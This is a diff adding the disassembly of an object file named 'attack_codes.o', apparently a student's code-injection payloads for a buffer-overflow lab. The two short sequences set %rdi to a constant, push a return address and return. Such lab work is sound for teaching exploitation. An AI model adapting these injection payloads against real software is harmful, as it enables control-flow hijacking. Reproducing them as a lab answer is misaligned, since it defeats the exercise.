@@ -1,0 +1,13 @@
+
+attack_codes.o：     文件格式 elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:	48 c7 c7 c8 87 81 3d 	mov    $0x3d8187c8,%rdi
+   7:	68 58 19 40 00       	pushq  $0x401958
+   c:	c3                   	retq   
+   d:	48 c7 c7 28 dd 61 55 	mov    $0x5561dd28,%rdi
+  14:	68 6f 1a 40 00       	pushq  $0x401a6f
+  19:	c3                   	retq   
